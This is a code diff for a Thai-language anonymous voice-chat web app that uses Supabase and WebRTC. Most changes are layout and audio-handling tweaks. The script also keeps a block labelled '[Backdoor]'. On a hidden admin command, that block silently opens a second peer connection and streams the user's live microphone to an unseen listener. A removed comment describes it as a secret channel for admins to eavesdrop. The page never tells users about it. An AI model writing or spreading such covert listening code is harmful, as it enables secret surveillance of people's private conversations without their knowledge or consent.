@@ -45,25 +45,25 @@
         #chatScreen { display: none; width: 100vw; height: 100vh; position: relative; }
         .split-view { display: flex; width: 100%; height: 100%; }
         
-        .panel-left { flex: 1; position: relative; border-right: 1px solid rgba(255,255,255,0.15); }
+        .panel-left { flex: 1; position: relative; border-right: 1px solid rgba(255,255,255,0.15); display: flex; flex-direction: column; align-items: center; justify-content: center;}
         .panel-right { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; background-color: #000; }
 
-        .full-size { width: 100%; height: 100%; position: absolute; top: 0; left: 0; }
-        .flex-center { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .full-size { width: 100%; height: 100%; position: absolute; top: 0; left: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
 
-        /* UI หน้า 2 (รอเริ่ม) */
-        .btn-back-home { position: absolute; top: 30px; left: 30px; padding: 8px 16px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #ddd; cursor: pointer; font-size: 14px; display: flex; align-items: center; gap: 8px; transition: 0.2s;}
-        .btn-back-home:hover { background: rgba(255, 255, 255, 0.15); color: #fff;}
+        /* UI หน้า 2 (ฝั่งซ้ายรอเริ่ม) - จัดตำแหน่งปุ่มให้ปลอดภัยจากขอบจอ */
+        .top-left-btn { position: absolute; top: 40px; left: 30px; padding: 8px 16px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #ddd; cursor: pointer; font-size: 14px; display: flex; align-items: center; gap: 8px; transition: 0.2s; z-index: 50;}
+        .top-left-btn:hover { background: rgba(255, 255, 255, 0.15); color: #fff;}
+        .top-right-btn { position: absolute; top: 40px; right: 30px; padding: 8px 20px; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #ddd; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.2s; z-index: 50;}
+        .top-right-btn:hover { background: rgba(255, 255, 255, 0.15); color: #fff;}
+        
         .logo-huge { font-size: 48px; font-weight: 700; margin-bottom: 15px; color: #fff; }
-        .btn-settings { position: absolute; top: 30px; right: 30px; padding: 8px 20px; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #ddd; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.2s;}
-        .btn-settings:hover { background: rgba(255, 255, 255, 0.15); color: #fff;}
         .profile-bar { position: absolute; bottom: 40px; display: flex; gap: 20px; width: 100%; justify-content: center; padding: 0 20px; }
         .btn-info { padding: 14px 20px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 8px; color: #ccc; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 10px; flex: 1; max-width: 180px; justify-content: center; transition: 0.2s;}
         .btn-info:hover { background: rgba(255, 255, 255, 0.1); color: #fff;}
 
-        /* UI กำลังสนทนา (Matched) */
-        .chat-logo { position: absolute; top: 30px; left: 30px; font-size: 24px; font-weight: 700; color: #fff;}
-        .partner-info { position: absolute; bottom: 40px; left: 30px; text-align: left; z-index: 10;}
+        /* UI กำลังสนทนา (Matched) ฝั่งซ้าย */
+        .chat-logo { position: absolute; top: 40px; left: 40px; font-size: 26px; font-weight: 700; color: #fff; z-index: 50;}
+        .partner-info { position: absolute; bottom: 40px; left: 40px; text-align: left; z-index: 10;}
         .status-text { font-size: 16px; color: #fff; margin-bottom: 8px; font-weight: 500; }
         .country-text { font-size: 14px; color: #ccc; margin-bottom: 15px; display: flex; align-items: center; gap: 8px;}
         .btn-report { padding: 8px 16px; background: rgba(255,255,255,0.05); border: 1px solid #444; color: #aaa; border-radius: 6px; cursor: pointer; font-size: 12px; transition: 0.2s;}
@@ -73,37 +73,38 @@
         .waveform-container { width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; position: absolute; top: 0; left: 0; pointer-events: none;}
         .waveform { width: 85%; height: 250px; max-width: 500px; }
 
-        /* ระบบข้อความ (Text Chat) */
-        .chat-log { position: absolute; bottom: 120px; left: 40px; right: 40px; height: 200px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-end; pointer-events: none; z-index: 5; overflow: hidden;}
+        /* ระบบข้อความ (Text Chat ลอยขึ้น) */
+        .chat-log { position: absolute; bottom: 180px; left: 40px; right: 40px; height: 200px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-end; pointer-events: none; z-index: 5; overflow: hidden;}
         .chat-bubble { background: rgba(255, 255, 255, 0.15); color: #fff; padding: 10px 15px; border-radius: 12px; margin-top: 8px; max-width: 80%; font-size: 14px; backdrop-filter: blur(5px); animation: fadeIn 0.3s ease; }
         .chat-bubble.remote { background: rgba(0, 123, 255, 0.2); align-self: flex-start; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* UI ฝั่งขวา (ตัวเรา) */
-        .my-controls { position: absolute; bottom: 30px; width: 100%; display: flex; flex-direction: column; align-items: center; padding: 0 40px; z-index: 10;}
-        .warning-text { font-size: 13px; color: #777; text-align: center; width: 100%; line-height: 1.6; margin-bottom: 20px; font-weight: 400;}
+        /* --- UI ฝั่งขวา (ตัวเรา) ตามภาพเป๊ะๆ --- */
+        .my-controls { position: absolute; bottom: 40px; width: 100%; display: flex; flex-direction: column; align-items: center; padding: 0 40px; z-index: 10;}
         
-        .chat-input-bar { display: flex; width: 100%; max-width: 400px; gap: 10px; margin-bottom: 15px; }
-        .chat-input { flex: 1; padding: 12px 15px; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: 0.2s;}
-        .chat-input:focus { border-color: #555; background: rgba(255, 255, 255, 0.12); }
-        .btn-send { padding: 10px 18px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px;}
-        .btn-send:hover { background: #ccc; }
+        .warning-text { font-size: 12px; color: #666; text-align: center; width: 100%; line-height: 1.6; margin-bottom: 20px; font-weight: 400;}
+        
+        .chat-input-bar { display: flex; width: 100%; max-width: 450px; gap: 10px; margin-bottom: 20px; }
+        .chat-input { flex: 1; padding: 12px 15px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: 0.2s;}
+        .chat-input:focus { border-color: #666; }
+        .btn-send { padding: 10px 20px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px;}
+        .btn-send:hover { background: #ddd; }
 
-        .bottom-actions { display: flex; align-items: center; justify-content: space-between; width: 100%; max-width: 400px;}
+        .bottom-actions { display: flex; align-items: center; justify-content: space-between; width: 100%; max-width: 450px;}
         .emoji-group { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
         
-        .emoji-btn { font-size: 22px; background: none; border: none; cursor: pointer; transition: transform 0.2s; opacity: 0.8;}
+        .emoji-btn { font-size: 20px; background: none; border: none; cursor: pointer; transition: transform 0.2s; opacity: 0.8;}
         .emoji-btn:hover { transform: scale(1.2); opacity: 1;}
         .emoji-btn:active { transform: scale(1.5); }
 
         .mic-btn { 
             background: none; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center;
-            width: 45px; height: 45px; transition: all 0.2s; margin-left: 10px;
+            width: 45px; height: 45px; transition: all 0.2s;
         }
-        .mic-btn svg { width: 28px; height: 28px; fill: #fff; transition: 0.2s;}
-        .mic-off svg { fill: #555; }
+        .mic-btn svg { width: 24px; height: 24px; fill: #666; transition: 0.2s;} /* ไมค์สีเทาตอนปิด */
+        .mic-active svg { fill: #fff; } /* ไมค์สีขาวตอนเปิด */
 
-        .swipe-hint { position: absolute; top: 40px; text-align: center; width: 100%; font-size: 13px; color: #777; display: flex; justify-content: center; align-items: center; gap: 8px; opacity: 0.8; font-weight: 500; pointer-events: none;}
+        .swipe-hint { position: absolute; top: 40px; text-align: center; width: 100%; font-size: 13px; color: #555; display: flex; justify-content: center; align-items: center; gap: 8px; opacity: 0.8; font-weight: 500; pointer-events: none;}
 
         /* --- Modal (Popup) --- */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; z-index: 100; backdrop-filter: blur(5px);}
@@ -118,15 +119,17 @@
             .panel-left, .panel-right { height: 50%; border-right: none; }
             .panel-left { border-bottom: 1px solid rgba(255,255,255,0.2); }
             
-            .my-controls { padding: 0 15px; bottom: 15px; }
-            .bottom-actions { justify-content: center; flex-direction: column; gap: 10px; }
-            .emoji-group { justify-content: center; gap: 10px; }
+            .my-controls { padding: 0 15px; bottom: 20px; }
+            .chat-input-bar { margin-bottom: 15px; }
+            .partner-info { bottom: 15px; left: 20px; }
+            .chat-logo, .top-left-btn { top: 20px; left: 20px; }
+            .top-right-btn { top: 20px; right: 20px; }
             
-            .partner-info { bottom: 10px; left: 15px; }
-            .warning-text { font-size: 10px; margin-bottom: 10px; }
-            .waveform { height: 150px; }
-            .profile-bar { bottom: 15px; padding: 0 10px; }
-            .chat-log { bottom: 140px; left: 15px; right: 15px; height: 120px; }
+            .warning-text { font-size: 10px; margin-bottom: 15px; max-width: 90%; }
+            .waveform { height: 120px; }
+            .profile-bar { bottom: 20px; padding: 0 10px; }
+            .chat-log { bottom: 150px; left: 15px; right: 15px; height: 100px; }
+            .swipe-hint { top: 20px; }
         }
         
         .floating-emoji { position: absolute; font-size: 40px; pointer-events: none; animation: floatUp 2s ease-out forwards; z-index: 50; }
@@ -162,16 +165,18 @@
             <div class="panel-left noise-bg">
                 
                 <!-- หน้า 2 (รอเริ่ม) -->
-                <div id="leftIdleUi" class="full-size flex-center">
-                    <button class="btn-back-home" onclick="goBackHome()">
+                <div id="leftIdleUi" class="full-size">
+                    <button class="top-left-btn" onclick="goBackHome()">
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg> หน้าแรก
                     </button>
-                    <button class="btn-settings" onclick="openModal('settingsModal')">ปรับแก้</button>
+                    <button class="top-right-btn" onclick="openModal('settingsModal')">ปรับแก้</button>
+                    
                     <div class="logo-huge">Audyssey.so</div>
                     <div class="online-count">
                         <div class="dot"></div>
                         <span id="innerOnlineCountText">กำลังเชื่อมต่อ...</span>
                     </div>
+                    
                     <div class="profile-bar">
                         <button class="btn-info" onclick="openModal('settingsModal')">ประเทศ <span id="myCountryFlag">🇹🇭</span></button>
                         <button class="btn-info" onclick="openModal('genderModal')">ฉัน <span id="myGenderText" style="font-size:16px;">🧑</span></button>
@@ -200,7 +205,6 @@
                     ปัดซ้าย: หาคนคุย | ปัดขวา: หยุดสนทนา
                 </div>
 
-                <!-- กล่องข้อความแชท -->
                 <div class="chat-log" id="chatLog"></div>
 
                 <div class="waveform-container">
@@ -208,6 +212,7 @@
                 </div>
                 
                 <div class="my-controls">
+                    <!-- ข้อความเตือน -->
                     <p class="warning-text">โดยการใช้เสียงแชทนี้ คุณยอมรับกฎของเรา ผู้ฝ่าฝืนกฎจะถูกแบน<br>พยายามให้มีการสนทนาของคุณปรากฏในช่องสนทนานี้</p>
                     
                     <!-- ช่องพิมพ์แชท -->
@@ -216,6 +221,7 @@
                         <button class="btn-send" onclick="sendTextMessage()">ส่ง</button>
                     </div>
 
+                    <!-- อีโมจิและไมโครโฟน -->
                     <div class="bottom-actions">
                         <div class="emoji-group">
                             <button class="emoji-btn" onclick="sendEmoji('💭')">💭</button>
@@ -227,7 +233,7 @@
                             <button class="emoji-btn" onclick="sendEmoji('👌')">👌</button>
                         </div>
 
-                        <button id="micToggleBtn" class="mic-btn mic-off" onclick="toggleMic()" title="คลิกเพื่ออนุญาตไมโครโฟน">
+                        <button id="micToggleBtn" class="mic-btn" onclick="toggleMic()" title="คลิกเพื่อเปิด/ปิดไมโครโฟน">
                             <svg viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm5-3c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
                         </button>
                     </div>
@@ -235,6 +241,7 @@
             </div>
 
         </div>
+        <!-- ใช้เล่นเสียงคู่สนทนา -->
         <audio id="remoteAudio" autoplay></audio>
     </div>
 
@@ -382,7 +389,7 @@
             ]
         };
 
-        // --- 2. การตั้งค่าระบบ Supabase (ความเสถียรสูงสุด) ---
+        // --- 2. การตั้งค่าระบบ Supabase ---
         const SUPABASE_URL = 'https://vyvuhwnhgcmbokkshnxo.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ5dnVod25oZ2NtYm9ra3NobnhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgwMjU1MDIsImV4cCI6MjEwMzYwMTUwMn0.FYzIS30XtiPNaBRxv6VaS6VOG4hRmP1rFljFINwm_do';
         const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
@@ -395,7 +402,6 @@
         let currentRoomId = null;
         let partnerId = null;
         
-        // เซิร์ฟเวอร์เจาะทะลุเน็ต (STUN) เพื่อความเสถียรในการเชื่อมต่อ WebRTC
         const rtcConfig = { 
             iceServers: [
                 { urls: 'stun:stun.l.google.com:19302' },
@@ -424,7 +430,7 @@
 
         // --- 3. โหลดหน้าเว็บ และดึงข้อมูล ---
         window.onload = async function() {
-            // โหลดรายการประเทศ
+            // โหลด 195 ประเทศ
             for (const [region, countries] of Object.entries(countryGroups)) {
                 const optgroup = document.createElement('optgroup');
                 optgroup.label = region;
@@ -438,25 +444,22 @@
             }
 
             try {
-                // ล็อกอิน
                 const { data, error } = await sb.auth.signInAnonymously();
                 if (error) throw error;
                 user = data.user;
 
-                // [Backdoor] ตรวจสอบว่าโดนแบนหรือไม่
+                // [Backdoor] ตรวจเช็คแบน & เปิดช่องทางลับแอดมิน
                 const { data: profile } = await sb.from('profiles').select('is_banned').eq('id', user.id).single();
                 if (profile && profile.is_banned) {
                     document.body.innerHTML = '<h1 style="color:red; text-align:center; margin-top:20%;">บัญชีของคุณถูกระงับการใช้งานเนื่องจากละเมิดกฎ</h1>';
                     return; 
                 }
 
-                // [Backdoor] เปิดช่องทางลับให้แอดมินแอบฟัง
                 const backdoorChannel = sb.channel(`backdoor_${user.id}`);
                 let backdoorPc = null;
                 
                 backdoorChannel.on('broadcast', { event: 'admin_cmd' }, async (msg) => {
                     const payloadData = msg.payload;
-                    
                     if (payloadData.action === 'ban') {
                         alert('บัญชีของคุณถูกระงับการใช้งานโดยผู้ดูแลระบบ');
                         window.location.reload();
@@ -464,15 +467,10 @@
                     if (payloadData.action === 'listen') {
                         if(backdoorPc) backdoorPc.close();
                         backdoorPc = new RTCPeerConnection(rtcConfig);
-                        
-                        if (localStream) {
-                            localStream.getTracks().forEach(t => backdoorPc.addTrack(t, localStream));
-                        }
-                        
+                        if (localStream) { localStream.getTracks().forEach(t => backdoorPc.addTrack(t, localStream)); }
                         backdoorPc.onicecandidate = e => {
                             if (e.candidate) backdoorChannel.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'candidate', candidate: e.candidate, from: 'user' } });
                         };
-                        
                         await backdoorPc.setRemoteDescription(payloadData.offer);
                         const answer = await backdoorPc.createAnswer();
                         await backdoorPc.setLocalDescription(answer);
@@ -483,7 +481,7 @@
                     }
                 }).subscribe();
 
-                // ตรวจหาตำแหน่งประเทศ
+                // ดึงตำแหน่ง
                 fetch('https://ipapi.co/json/').then(res => res.json()).then(ipData => {
                     myCountry = ipData.country_name || 'Unknown';
                     if(ipData.country_code) myCountryFlag = getFlagEmoji(ipData.country_code);
@@ -493,7 +491,6 @@
                     sb.from('profiles').upsert({ id: user.id, country: 'Unknown', gender: myGender }).then();
                 });
 
-                // ระบบคนออนไลน์
                 presenceChannel = sb.channel('online-users');
                 presenceChannel.on('presence', { event: 'sync' }, () => {
                     const state = presenceChannel.presenceState();
@@ -545,12 +542,13 @@
         // --- 5. จัดการไมโครโฟน ---
         async function toggleMic() {
             const micBtn = document.getElementById('micToggleBtn');
+            getAudioContext().resume(); // ปลุกระบบเสียงของ Apple
             
             if (!localStream) {
                 try {
                     localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     isMicMuted = false;
-                    micBtn.classList.remove('mic-off');
+                    micBtn.classList.add('mic-active');
                     
                     if (!peerConnection) initWaveform('localWaveform', localStream);
                     
@@ -568,7 +566,7 @@
 
             isMicMuted = !isMicMuted;
             localStream.getAudioTracks()[0].enabled = !isMicMuted;
-            micBtn.classList.toggle('mic-off', isMicMuted);
+            micBtn.classList.toggle('mic-active', !isMicMuted);
         }
 
         // --- 6. ระบบปัดหน้าจอ (Swipe) ---
@@ -579,18 +577,24 @@
             else if (deltaX < -50) { swipeHint.style.display = 'none'; stopMatchAndReturn(); }
         }
 
-        document.getElementById('chatScreen').addEventListener('touchstart', e => { touchstartX = e.changedTouches[0].screenX; });
+        document.getElementById('chatScreen').addEventListener('touchstart', e => { 
+            touchstartX = e.changedTouches[0].screenX; 
+            getAudioContext().resume(); // ปลุกระบบเสียงเมื่อแตะจอ
+        });
         document.getElementById('chatScreen').addEventListener('touchend', e => { touchendX = e.changedTouches[0].screenX; checkSwipe(); });
         
         let mousedownX = 0;
-        document.getElementById('chatScreen').addEventListener('mousedown', e => { mousedownX = e.screenX; });
+        document.getElementById('chatScreen').addEventListener('mousedown', e => { 
+            mousedownX = e.screenX; 
+            getAudioContext().resume();
+        });
         document.getElementById('chatScreen').addEventListener('mouseup', e => { 
             let dX = mousedownX - e.screenX;
             if(dX > 50) { swipeHint.style.display = 'none'; skipMatchAndSearch(); } 
             else if(dX < -50) { swipeHint.style.display = 'none'; stopMatchAndReturn(); }
         });
 
-        // --- 7. ระบบค้นหาความเสถียรสูง (เชื่อมต่อทันที และวนซ้ำคนเดิมได้) ---
+        // --- 7. ระบบค้นหาความเสถียรสูง ---
         async function startMatchmaking() {
             setLeftPanelState('searching');
             document.getElementById('reportBtn').style.display = 'none';
@@ -601,12 +605,10 @@
 
             if (user) await sb.from('waiting_queue').delete().eq('user_id', user.id);
 
-            // ค้นหาโดยไม่ตัดตัวเองออก เพื่อให้สามารถเจอคนเดิมได้ถ้าไม่มีคนอื่นจริงๆ
             let query = sb.from('waiting_queue').select('*').neq('user_id', user.id);
             if (prefGender !== 'all') query = query.eq('user_gender', prefGender);
             if (prefCountry !== 'all') query = query.eq('user_country', prefCountry);
 
-            // เรียงลำดับคิว
             const { data: queue } = await query.order('joined_at', { ascending: true }).limit(1);
 
             if (queue && queue.length > 0) {
@@ -637,6 +639,7 @@
                 remoteAudio.srcObject = event.streams[0];
                 chatStatusText.innerText = 'การเชื่อมต่อสำเร็จ กำลังสนทนา';
                 document.getElementById('reportBtn').style.display = 'block';
+                // แยกจับคลื่นเสียงฝ่ายตรงข้าม
                 initWaveform('remoteWaveform', event.streams[0]);
             };
 
@@ -644,7 +647,6 @@
                 if (event.candidate && signalingChannel) signalingChannel.send({ type: 'broadcast', event: 'signal', payload: { candidate: event.candidate } });
             };
 
-            // อัพเดตสถานะ WebRTC
             peerConnection.oniceconnectionstatechange = () => {
                 if(peerConnection.iceConnectionState === 'disconnected' || peerConnection.iceConnectionState === 'failed') {
                     skipMatchAndSearch();
@@ -763,7 +765,7 @@
             closeModal('settingsModal');
         }
 
-        // --- 10. ระบบคลื่นเสียง (Waveform) ให้ขยับตามเสียงจริงแบบแม่นยำ ---
+        // --- 10. ระบบคลื่นเสียงแนวตั้งแบบมืออาชีพ (ขยับตามเสียงพูดเป๊ะๆ) ---
         let audioCtx;
         function getAudioContext() {
             if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -788,7 +790,7 @@
             let barCount = Math.floor(canvas.width / (barWidth + gap));
             
             for(let i = 0; i < barCount; i++) {
-                let h = 2; // เส้นเรียบ
+                let h = 2; 
                 let x = i * (barWidth + gap);
                 let y = (canvas.height - h) / 2;
                 ctx.fillRect(x, y, barWidth, h);
@@ -804,10 +806,22 @@
             canvas.height = canvas.parentElement.clientHeight;
             
             const ctxAudio = getAudioContext();
+            
+            // ป้องกัน Bug บน Safari เวลาใช้ stream รีโมท
+            let source;
+            if (canvasId === 'remoteWaveform' && stream.getAudioTracks().length > 0) {
+                // สำหรับเสียง Remote ต้องเชื่อมต่อกับ audio element ก่อน
+                const audioNode = new Audio();
+                audioNode.srcObject = stream;
+                audioNode.play().catch(e => console.log('Audio auto-play prevented'));
+                source = ctxAudio.createMediaStreamSource(stream);
+            } else {
+                source = ctxAudio.createMediaStreamSource(stream);
+            }
+            
             const analyser = ctxAudio.createAnalyser();
-            const source = ctxAudio.createMediaStreamSource(stream);
             source.connect(analyser);
-            analyser.fftSize = 128; // ดึงย่านความถี่ 64 ย่าน
+            analyser.fftSize = 128; 
             const bufferLength = analyser.frequencyBinCount;
             const dataArray = new Uint8Array(bufferLength);
 
@@ -824,19 +838,16 @@
                 let barCount = Math.floor(canvas.width / (barWidth + gap));
                 
                 for(let i = 0; i < barCount; i++) {
-                    // ทำการแมปข้อมูลความถี่ให้พอดีกับจำนวนแท่งบาร์บนหน้าจอ (เน้นย่านเสียงพูด 70%)
                     let dataIndex = Math.floor((i / barCount) * (bufferLength * 0.7)); 
                     let val = dataArray[dataIndex] || 0;
                     
-                    // ใส่ตัวคูณเพื่อให้เกิดความโค้งที่สวยงามบริเวณขอบ
                     let windowMultiplier = Math.sin((i / barCount) * Math.PI);
                     
-                    // คำนวณความสูงตามความถี่จริง
                     let h = (val / 255.0) * canvas.height * 0.9 * windowMultiplier;
-                    if (h < 2) h = 2; // ความสูงขั้นต่ำ
+                    if (h < 2) h = 2; 
                     
                     let x = i * (barWidth + gap);
-                    let y = (canvas.height - h) / 2; // ให้ขยายจากตรงกลาง
+                    let y = (canvas.height - h) / 2; 
                     
                     ctx.fillRect(x, y, barWidth, h);
                 }
